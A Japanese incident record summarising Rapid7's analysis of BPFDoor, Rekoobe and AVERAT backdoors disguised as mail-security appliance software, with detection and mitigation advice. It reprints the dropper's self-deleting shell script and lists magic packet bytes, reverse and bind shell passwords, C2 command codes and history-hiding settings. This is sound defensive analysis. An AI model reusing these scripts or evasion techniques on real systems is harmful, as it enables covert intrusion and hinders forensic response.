INC-2026-0319BPFDoor と AVERAT が境界に常駐

Rapid7 が、アジアのメールセキュリティ製品に化けて通信事業者の境界に常駐する Linux のバックドア群を公表した。韓国の迷惑メール対策製品 SpamSniper の PID ファイルとプロセス名を装う新しい BPFDoor 亜種、 送信元・宛先ともポート25だけを見張る BPF フィルタを持つ Rekoobe、 台湾の ShareTech 製アプライアンス向けとみられるドロッパ、 そして同社が AVERAT と呼ぶ Linux インプラントの6種のビルドである。 ドロッパは2つのペイロードを /sbin へ ntpdate・udevds の名で置いて起動し、 10秒後にファイルを削除する——プロセスは走り続け、ディスク上に実体が残らない。 AVERAT は外向きに SMTP（ポート25）を話して C2 とつながり、 中継には台湾の中華電信 HiNet にある第三者被害者の NAS・録画装置・SMB 用機器が 使われていた。Rapid7 は、この機器構成が CISA らの2026年4月の共同勧告 AA26-113A が示した中国に連なる ORB 網の典型と一致するとしつつ、 既知の ORB 網との指標の重なりは見つからなかったとしている

脅威・攻撃キャンペーン初報のみ有名事象として記録（日本と直接の関係は薄い）脆弱性の放置設計・実装上の不備委託先・供給元起因
初報: 2026年10月2日 最終更新: 2026年10月4日

狙われたのは、メールサーバの前に立っている箱です。

Rapid7 が公表したのは、その箱の中身に合わせて化けた Linux のバックドア群です。4つの部品があります。

部品 偽装
新しい BPFDoor 亜種 韓国の迷惑メール対策製品 SpamSniper の PID ファイル（/var/run/spamsniper.pid）を装い、10個の Linux デーモン名を使い回す
BPF Rekoobe /sniper/bin/crond・/sniper/bin/earsd・/sniper/apache/bin/httpd・/sniper/snipe/bin/snipe-smtpd などその製品の中にある名前を使う
ドロッパ 暗号鍵を SHA1("ShareTech") の先頭16バイトから作る（台湾のアプライアンス製品の名前）
AVERAT（6種のビルド） 台湾のアプライアンスに置かれ、外向きに SMTP を話す

共通するのは「その環境でなら不自然に見えない」という設計です。 Rapid7 の表現では「地域化された偽装（regionalized disguise）」——どの検体も標的の機器で動いているベンダー製ソフトを把握したうえでプロセス名を偽装しています（原文英語）。

ドロッパの動きが象徴的です。2つのペイロードを /sbin に ntpdate と udevds という名前で置いて起動し、10秒後にファイルを削除します。プロセスは走り続けるので、ディスク上に実体がありません（/proc/<pid>/exe は (deleted) を指す）。ハッシュを取るものも、隔離するものも、提出するものも残らない。しかも/sbin/ntpdate はドロッパ自身の再実行で、2つ目のインスタンスは監視役（watchdog）として常駐し、消えたファイルを書き戻します。

AVERAT の C2 はポート25の SMTP です。EHLO を送り、STARTTLS を要求し、そのうえで独自の暗号セッションを始めます。メールセキュリティゲートウェイにとって、任意のメールサーバへの外向き SMTP は本来の仕事そのものです——フロー記録の上では正規の通信と区別がつきません。

Rekoobe 側はさらに露骨です。BPF フィルタが送信元ポート25・宛先ポート25の通信を見張ります。SpamSniper のアプライアンスの前段のファイアウォールには、ふつう ACCEPT tcp --sport 25 --dport 25（MTA 間の中継）という規則があります。その規則に合う魔法のパケットは、ステートフル検査の前に生のソケットへ届きます。 Rapid7 の評価では「このクラスのホストでどんな通信の形なら見えないかを、実装した側は正確に理解していた」。

そして C2 の中継は、他人の機器でした。3つの IP はいずれも台湾の中華電信 HiNet（AS3462）の、台南・板橋・桃園にある燃料小売事業者の Synology NAS、組み込みの SMB 用ネットワーク機器、Dahua の録画装置です。3台すべてでポート1723に PPTP が動いており、バナーがバイト単位で同一 ——Rapid7 はこれを攻撃者が入れたものと評価しています。つまり各ノードは、実装の通信を受ける出口であると同時に、その LAN へ入る VPN の足場でもあります。

本記録の起点は、2026年10月2日に公開された Rapid7 の報告そのものです。

攻撃の経過

公表された範囲の事実のみ。公表されていない段階は補完せず明示しています。

**メールサーバの前段に置かれるアプライアンスを標的に、 その製品の名前と通信の形に合わせて偽装した Linux のバックドアを常駐させる。** 台湾クラスタでは、ローカルのドロッパ（鍵は SHA1("ShareTech") 由来）が 2つのペイロードを `/sbin` に `ntpdate`・`udevds` の名で置いて起動し、 **10秒後にファイルを削除してディスク上の実体を消す** ——一方は AVERAT、もう一方はドロッパ自身の再実行による監視役である。 AVERAT は**外向きにポート25で SMTP を話して C2 とつながり**、 設定は RC4 の鍵流で暗号化、コマンドでシェル（最大10並行）・ファイル操作・ 代理・モジュール読み込み・C2 表の上書きが可能。 韓国クラスタでは、**SpamSniper の PID ファイルとプロセス名を装う BPFDoor 亜種**と、 **送信元・宛先ともポート25の通信を見張る BPF Rekoobe** が、 魔法のパケットを待つ受動型の足場として動く。 **C2 の中継は、台湾 HiNet の第三者被害者の NAS・録画装置・SMB 用機器**であり、 3台すべてに攻撃者が入れたとみられる PPTP が動いている。

  1. 1. 実行確認済
    **ドロッパ（SHA-256 2bedc26d…）がアプライアンス上で実行される。** x86-64 の ELF で、インポートは `fopen`・`fwrite`・`fputs`・`fclose`・`chmod`・ `system`・`strlen`・`sleep`・`access`・`memcpy`・`exit` のみ、**ネットワーク機能は無い。** **AES-128-ECB の4つの塊を、SHA1("ShareTech") の先頭16バイトを鍵に復号**し、 3つのパスと1つのシェルスクリプトを得る。 **`/tmp/flag` が存在し `.php` のスクリプトが存在しないときだけ** インストールの分岐が動き、スクリプトを `/HDD/ms6x2xTo64/updIptable.php` に 書いて `0777` にし `system()` に渡す。
    根拠: Rapid7 の検体解析（鍵導出ルーチン・復号された文字列）
  2. 2. 検知回避確認済
    **スクリプトが `/addpkg/sbin/update` を `/sbin/ntpdate` へ、 `/addpkg/sbin/agetty` を `/sbin/udevds` へ複製して起動し、 それぞれ10秒後に削除する。** **プロセスは走り続け、ディスク上に実体が無い** （`/proc/<pid>/exe` は `(deleted)`）。 **`/sbin/ntpdate` はドロッパ自身の再実行**で、 2つ目のインスタンスは門を通れず**2秒間隔の監視役**となり、 `execProcEnd` とスクリプトが消えるたびに作り直す。 Rekoobe 側は `VIMINIT="set viminfo="`・`HISTFILE=/dev/null`・`HISTSIZE=0`・ `HISTFILESIZE=0` を設定して**コマンドの履歴を残さない。**
    根拠: Rapid7 の検体解析（スクリプト本文・監視役の挙動・環境変数の設定）
  3. 3. 永続化推定
    **永続化のコードが無い。** Rapid7 は、**`/addpkg/sbin/` がアプライアンス自身の追加パッケージ用 ディレクトリであるため、ファームウェアのパッケージ起動処理が 再起動時に立ち上げる可能性が高い**と評価している。 **BPFDoor 亜種は `/var/run/spamsniper.pid` をミューテックスとして使い**、 製品の PID ファイルに成りすます。 **AVERAT は通信間隔を隠しファイル（`/var/lib/.db`・`.sencha`・`.us`・`.a`）に 保存し、再起動をまたいで保持する。**
    根拠: Rapid7 の検体解析（IoC のホスト上の痕跡一覧・監視役の実装）
  4. 4. C2通信確認済
    **AVERAT は外向きにポート25へつなぎ SMTP を話す**—— `EHLO` を送り `STARTTLS` を要求し、**そのうえで独自の暗号セッションを始める。** **TLS 層は手作りで、固定の ClientHello テンプレート（40項目の暗号スイート一覧と 固定の拡張順序）がバイナリに埋め込まれている。** 相手の認証は**アプリケーション層の共有秘密の握手に委ね、魔法の値は 1571（0x0623）。** **定期通信は600〜699秒ごと**で、ホスト名・利用者・OS の版・ ネットワークインタフェース・ログイン中の利用者を報告する。 **BPFDoor 亜種は受動型**で、生の `PF_PACKET` ソケットに古典的 BPF フィルタを 付け、**魔法のバイト 0x6693（UDP）・0x4274（TCP）・0x7820（ICMP）**に合致すると 送信元へ接続を返す（パスワード `gZbpx0` なら逆方向シェル、 `sT21xf` ならバインドシェル、それ以外は UDP のノック）。 **Rekoobe は送信元・宛先ともポート25 の TCP/UDP/SCTP IPv4 と UDP IPv6 を 26命令の BPF で見張る。**
    根拠: Rapid7 の検体解析（通信の流れ・BPF フィルタ・魔法のバイト・握手）
  5. 5. 内部探索確認済
    **AVERAT のコマンドで、ディレクトリの列挙（20）、 所有者を解決しながらの再帰走査（30）、 コマンドライン付きのプロセス列挙（629）が可能。** **定期通信そのものがホストの基本情報 （ホスト名・利用者・OS の版・インタフェース・ログイン中の利用者）を運ぶ。**
    根拠: Rapid7 のコマンド表（表4）と定期通信の解析
  6. 6. 横展開確認済
    **AVERAT のコマンド 1618 は、アプライアンスを通した代理・ポート転送の チャネルを開く。** **中継に使われた3台の機器にはポート1723の PPTP が動いており （バナーがバイト単位で同一）、Rapid7 はこれを攻撃者が入れたものと評価する** ——結果として各ノードは**外向きの中継**であると同時に **そのホストの LAN へ入る経路のある VPN の足場**になる。 **「このキャンペーンは接続の両端に中継の能力を持つ」**（Rapid7 の整理）。
    根拠: Rapid7 のコマンド表と走査データ（PPTP のバナーの一致）
  7. 7. 持ち出し確認済
    **AVERAT のコマンドで、再開対応のファイルのダウンロード（21）、 分割アップロード（22）が可能で、転送は C2 のチャネル上で行われる。** **BPFDoor のデータプレーン亜種は Tiny Shell のセッションを開き、 単一バイトの 'S'/'U'/'D'（対話シェル・アップロード・ダウンロード）を 処理し、iptables の NAT リダイレクトの設定と撤去のロジックを持つ。** **メールセキュリティアプライアンスは組織の受信・送信の通信を インラインで見られる位置にある**（Rapid7 の指摘）。
    根拠: Rapid7 のコマンド表、Tiny Shell / Rekoobe 統合の解析
  8. 8. 影響（暗号化・破壊・改ざん）確認済
    **破壊・暗号化は報告されていない。** **AVERAT はコマンド 916 で、バッファをディスクへ流し込んでから カーネル経由で再起動を強制できる**（init を経由しない）。 **632 でプロセスを終了（SIGTERM）できる。** 影響は**境界に居続けること**であり、 Rapid7 は**「インラインでメールサーバの前段に置かれるアプライアンスを 標的にすることで、そこに置かれた実装は組織の受信・送信の通信を 見通せる」**としている（原文英語）。
    根拠: Rapid7 のコマンド表と結語の評価

その機器にとって正常な通信に、C2 を重ねた概観

この報告の核心は、偽装の精度です。

① プロセス名を、その製品の中にある名前にする。

BPF Rekoobe が使う名前はこうです（報告の表2）。

偽装したプロセス名 説明
/sniper/bin/crond -n Sniper プラットフォームの cron デーモン
/sniper/bin/earsd --start earsd——Sniper の EMS／警報デーモン
/usr/lib/polkit-1/polkitd --no-debug 汎用の Linux の偽装（どのディストロでも馴染む）
/sniper/apache/bin/httpd -k start Sniper に同梱された Apache
/sniper/snipe/bin/snipe-smtpd Sniper の内部 SMTP デーモン

/sniper/ 配下の名前は、その製品が入っていないホストでは成立しません。逆に言えば、攻撃者は標的に何が入っているかを知っていたということです。BPFDoor 亜種の方は /var/run/spamsniper.pid をミューテックスに使い、10個の Linux デーモン名（[watchdogd]・/usr/sbin/chronyd・polkitd・rsyslogd・[scsi_tmf_6]・crond・NetworkManager・python -Es・tuned・[charger_manager]・[kaluad_sync]）を使い回します。

もう1つの検体は ora_ppmond を装います—— Rapid7 の説明ではOracle を基盤とする通信事業者の加入者・プロビジョニングプラットフォーム（HSS、OSS/BSS）の命名規則の模倣で、その種類の基盤が実際に動いているホストでしか正当に見えない偽装です。

② 通信を、その機器の本来の仕事に重ねる。

AVERAT は外向きにポート25へつなぎ、SMTP を話します—— EHLO を送り、STARTTLS を要求し、そのうえで独自の暗号セッションを始めます。メールセキュリティゲートウェイにとって、任意のメールサーバへの外向き SMTP は本来の機能そのものであり、フロー記録では正規の通信と区別がつきません。

Rekoobe 側は受動型です。送信元ポート25・宛先ポート25の通信を BPF フィルタで見張ります。SpamSniper のアプライアンスの前段には、ふつうこういう規則があります。

ACCEPT tcp --sport 25 --dport 25   (MTA 間の中継)
ACCEPT tcp --dport 25             (受信メール)

送信元25・宛先25の魔法のパケットは、最初の規則に合致してステートフル検査の前に生のソケットへ届きます。 Rapid7 の評価——「このクラスのホストでどんな通信の形なら見えないかを、実装した側は正確に理解していた」（原文英語）。

③ 受動型だから、開いているポートが無い。

BPF の受動的な実装は通常のポート走査に映りません。外向きの定期通信はDNS・TCP の通常の通信に隠れ、ポート25 を使って視界の下に留まるとされます。

ディスクに実体を残さない——証拠を確保できる窓は10秒である原因・手口

ドロッパの動きを追います。

鍵の作り方から特徴的です。AES-128-ECB の鍵は SHA1("ShareTech") の先頭16バイト（6C CA D5 17 0E 3D B8 17 B3 DF 52 E0 D9 71 B1 48）。攻撃者は自分の鍵導出に、標的ベンダーの名前を種として入れています。

復号されるのは3つのパスと1つのスクリプトです。

/tmp/flag                        （前提条件の門——確認はするが書き込まない）
/HDD/ms6x2xTo64/updIptable.php   （.php 拡張子のシェルスクリプト）
/HDD/ms6x2xTo64/execProcEnd      （監視役の目印）

#!/bin/sh
/bin/cp -f /addpkg/sbin/update /sbin/ntpdate
chmod 755 /sbin/ntpdate
/sbin/ntpdate &
sleep 10
rm -rf /sbin/ntpdate
/bin/cp -f /addpkg/sbin/agetty /sbin/udevds
chmod 755 /sbin/udevds
/sbin/udevds &
sleep 10
rm -rf /sbin/udevds

実行は1つの前提条件で守られています—— /tmp/flag が既に存在し、かつ .php のスクリプトが存在しないときだけ、インストールの分岐が動きます。門を通ると、スクリプトをバルクストレージのマウントへ書き、0777 にして system() に渡して終了します。system() は sh -c でシェバング付きのファイルを実行するため、/HDD は書き込み可能かつ実行可能でなければなりません ——noexec のマウントでは EACCES が返り、シェルには代替のインタプリタがありません（Rapid7 の指摘）。

そして10秒後、ファイルは消えます。プロセスは走り続け、/proc/<pid>/exe は (deleted) を指します。 Rapid7 の表現では——「ハッシュを取るものも、隔離するものも、提出するものも何も無く、/sbin を grep した対応者は何も見つけられない」（原文英語）。

巧妙なのは /sbin/ntpdate がドロッパ自身の再実行である点です。 2つ目のインスタンスは .php が既にあるので門を通れず、2秒間隔の監視役に落ちて、execProcEnd とスクリプトが消えるたびに作り直します。 永続化のコードが無いのはそのためです—— /addpkg/sbin/ はアプライアンス自身の追加パッケージ用ディレクトリなので、ファームウェアのパッケージ起動処理が再起動時に立ち上げる可能性が高い（Rapid7 の評価）。

本記録が実務の論点として取り出すのはここです（本記録の評価）。ファイルを証拠として確保できるのは、起動から削除までの10秒だけ。それ以降はメモリの中にしかありません。 Rapid7 の検知の指針も、「実行ファイルが unlink されたプロセスを狩る」 ——/proc/<pid>/exe が unlink されたパスを指すもの、ディスク上の裏付けファイルを持たない実行可能ページを探すことから始まります。

AVERAT の作り——設定は暗号化され、未知のコマンドを投げると落ちる原因・手口

AVERAT の名前は、ディスク上の唯一の痕跡から来ています。 var という文字列が、XOR で符号化すると AVE と読める（報告の図7）。

通信——外向きにポート25、EHLO → STARTTLS → 独自の暗号セッション。TLS 層は標準の暗号ライブラリを使わず手作りで、固定の ClientHello テンプレート（40項目の暗号スイート一覧と固定の拡張の順序）がバイナリに埋め込まれています。相手の認証はアプリケーション層の共有秘密の握手に委ねられ、魔法の値は 1571（0x0623）です。

定期通信は600〜699秒ごとで、毎回ホスト名・現在の利用者・OS の版・ネットワークインタフェース・ログイン中の利用者を報告します。間隔は隠しファイル /var/lib/.db に保存され、攻撃者が変更でき、再起動をまたいで保持されます。

設定——276バイトの暗号化された塊に全ての運用値が入ります。鍵は塊自身の先頭16バイトから導出され（さらに1バイトを折り込み、逆順の XOR の連鎖を通す）、その鍵が RC4 の鍵スケジューリングの種になり、できた S-box をそのまま鍵流として使います。 各フィールドは鍵流の別の位置から始まり、その位置の偶奇でバイトをビット反転するかニブル回転するかが決まります。復号すると、3つの16バイト鍵（転送用・認証用・副次の握手用）、ホスト表、ポート表、3バイトのビルドタグ、タイミングの状態、.db のパスが出ます。ホストとポートの枠は3組あり、このビルドでは1つだけ埋まっています。

Rapid7 は AVERAT の設定抽出ツールを作ったとしています。6種のビルドで MAC 鍵と補助鍵はバイト単位で同一、ストリーム鍵が共有されているのは1組だけ。

コマンドは uint16 の値で、機能ごとの帯に分かれています（報告の表4より）。

コード 機能
20 / 21 / 22 / 25 / 30 ディレクトリ列挙／再開対応のダウンロード／分割アップロード（再開時は追記）／再帰削除／所有者を解決しながらの再帰走査
629 / 632 コマンドライン付きのプロセス列挙／プロセスの終了（SIGTERM）

1010 共有オブジェクトのモジュールを読み込み／取り外し（機能の拡張）

Rapid7 が「運用の成熟」を示すとした設計上の判断は3つです（原文英語）。

  1. 未知のコマンドコードを受けると、処理系はプロセスを終了する。実装は安価だが、生きている実装に対する対話的な探りや自動走査の費用を上げる。
  2. 10並行のシェル——単一の対話ではなく、複数の作業者による並行アクセスを想定している。
  3. 再起動は init を経由せず、sync() を呼んでからカーネル経由で強制する。 揮発する状態を壊す前にファイルシステムのバッファを流し込むのは、どの痕跡が再起動をまたいで残るかを正確に知っている作業者の振る舞い ——この連鎖ではすべてがメモリで起き、アクセスを再確立するための永続化はディスクにある。

帰属は「機器クラスの一致」までで止めてある帰属

報告の帰属の扱いを、正確に引きます。

一致を述べている部分—— AVERAT の C2 基盤は、CISA・NCSC-UK とパートナー機関の2026年4月の共同勧告 AA26-113A が「中国に連なる隠蔽／ORB 網の標準的な構成部品」として述べた機器のクラスと一致する。すなわち保守終了の NAS、エッジのアプライアンス、DVRであり、脆弱性が永久に修正されないことを理由に選ばれる（原文英語）。

一致しないと述べている部分——

「我々は、名前の付いた特定の ORB 網（LapDogs/UAT-7810、SPACEHOP、FLORAHOX）との基盤や指標の重なりを見つけなかった。これらの網の記録された標的はむしろ SOHO ルータを中心にしている。AVERAT の基盤は、既知の網への所属が確認されたというよりも、より広い ORB の機器クラスのパターンと整合する。」（原文英語）

そして結語は——「特定の帰属は、新しい検体と基盤が現れるにつれて継続的な評価であるべきだ」。

本記録はこの書き方を評価します（本記録の評価）。「機器の構成が一致する」ことと「その網に属する」ことは別であり、報告は両方を同じ段落で区別して書いています。 読み手が取り違えやすいのはここです——「中国に連なる ORB 網の典型と一致」という記述だけを抜くと、帰属が確定したかのように読めます。

韓国クラスタの裏付けも層が分かれています。SpamSniper の /var/run/spamsniper.pid というミューテックスと検体の出所が、そのビルドを韓国クラスタに結びつける——これは技術的な痕跡にもとづく分類であり、攻撃者の国籍の推定ではありません。

検知は「ファイルを探す」から「消えたファイルのプロセスを探す」へ移る対策・注意喚起

Rapid7 の検知の指針を、実施順に並べます（すべて報告の記述）。

前提——アプライアンス上でのファイルベースの検知は成功しそうにない。 /sbin にペイロードが残らないからである。

ホスト側

  • 実行ファイルが unlink されたプロセスを狩る ——Linux では /proc/<pid>/exe の対象に (deleted) が付く形で現れる
  • ファイルを持たない／unlink されたプロセスの実行を捉えるため、プロセスの記述子を監視し、/proc/<pid>/exe が unlink されたパスを指す場合を見つける。メモリマップを検査し、ディスク上の裏付けファイルを持たない実行可能ページを探す
  • .db の状態ファイルとドロッパの痕跡を警報にする ——ディレクトリ /HDD/ms6x2xTo64/、先頭が #!/bin/sh の .php 拡張子のシェルスクリプト、end という文字列を含む目印ファイル execProcEnd
  • プロセスツリーの並び——.php のパスに対する sh -c、続いて /sbin への cp と chmod、おおよそ10秒以内の同じパスへの rm -rf ——これが段取りの高精度な検知になる

ネットワーク側

  • アプライアンスからの外向き SMTP のうち、家庭用または組み込み機器に解決されるメール役のホスト名へ向かうもの——それ自体が調査に値する

緩和

  • パケットキャプチャを必要としない Linux システム上の、予期しない生のパケットソケットと古典的 BPF フィルタを調査する
  • メールサービスでないプロセスからの外向き TCP ポート25 の呼び戻しを確認する ——とくにプロセスが一般的なデーモンの名前に自分を改名している場合、隠れた PID やソケットの目印を作っている場合
  • 短命な段取りのバイナリを保全し、プロセスの引数・開いているファイル記述子・ソケットのメタデータ・過去の DNS の記録を収集する
  • ルータ・DVR・その他のエッジ機器への管理アクセスを制限し、隣接するホストが組み込み機器へ実行ファイルを書き込めるNFS や SMB のマウントを監視する

本記録が強調したいのは、最後の1つです（本記録の評価）。「隣のホストから書き込めるマウント」は、組み込み機器に実行ファイルを置く経路になります。アプライアンスそのものを堅くしても、同じ LAN の NAS 経由で書き込めるなら意味が薄れます。

    ドロッパはペイロードを `/sbin` に置いて起動し、**10秒後に削除する。** **プロセスは走り続け、`/proc/<pid>/exe` は `(deleted)` を指す。** Rapid7 は**「ハッシュを取るものも、隔離するものも、提出するものも何も無い」** と書いている（原文英語）。 **ファイルを前提にした運用（ハッシュ照合・隔離・提出）がそのまま空振りする。**
    取るべき行動 **Linux の境界機器とサーバで、 `/proc/<pid>/exe` が `(deleted)` を指すプロセスを定期的に洗い出す。** **メモリマップを見て、ディスク上の裏付けファイルを持たない 実行可能ページを探す。** 見つけたら**メモリから回収する手順**を用意する （ファイルは既に無いため、後から取れない）。
  • ポート25は、メールサービス以外のプロセスが使ってはいけない
    AVERAT は**外向きに25番で SMTP を話し、 `EHLO` → `STARTTLS` の後に独自の暗号セッションを始める。** Rekoobe は**送信元・宛先ともポート25**の通信を BPF で見張り、 **MTA 間中継を許す既存のファイアウォール規則 （`ACCEPT tcp --sport 25 --dport 25`）に合致して ステートフル検査の前に生のソケットへ届く。** **ポート単位の規則では区別できない**（本記録の整理）。
    取るべき行動 **外向き25番を、プロセス単位で許可する** （メールサービスのプロセス以外は遮断・警報）。 **宛先のホスト名の解決先を見る** ——Rapid7 は「メール役のホスト名が家庭用・組み込み機器に解決されるもの」を それ自体で調査に値するとしている。 **送信元ポートを25に固定した受信通信**を許す規則を見直す。
  • パケットキャプチャを必要としないホストに、生のパケットソケットは要らない
    BPFDoor と Rekoobe は**生の `PF_PACKET` ソケットに古典的 BPF フィルタを 付けて魔法のパケットを待つ。** **開いているポートを持たないため、ポート走査では見えない。** Rapid7 の緩和策の筆頭は **「パケットキャプチャを必要としない Linux システム上の、 予期しない生のパケットソケットと古典的 BPF フィルタを調査する」**である。
    取るべき行動 **サーバと境界機器で、生のパケットソケットを持つプロセスを列挙する** （`ss -0 -p` や `/proc/net/packet` を見る）。 **パケットキャプチャが業務上必要なホストの一覧を作り、 それ以外で見つかったものを調査する。** **魔法のバイト（0x6693・0x4274・0x7820）や ポート25 の BPF フィルタは、検体ごとに変わる**—— **仕組み（生ソケット＋BPF）で見る方が持続する。**
  • 組み込み機器への書き込み経路は、隣のホストにある
    Rapid7 の緩和策には **「隣接するホストが組み込み機器へ実行ファイルを書き込める NFS や SMB のマウントを監視する」**がある。 ドロッパも**アプライアンスのバルクストレージのマウント `/HDD` に スクリプトを書いており、`/HDD` が書き込み可能かつ実行可能であることに 依存している**——**`noexec` なら `EACCES` で止まる**（Rapid7 の指摘）。
    取るべき行動 **組み込み機器・アプライアンスのマウントを確認し、 書き込み可能かつ実行可能な領域を減らす（`noexec` を付ける）。** **同じ LAN のホストから組み込み機器へ書き込める共有を洗い出し、 不要なら外す。** 機器の管理アクセスを限定する。
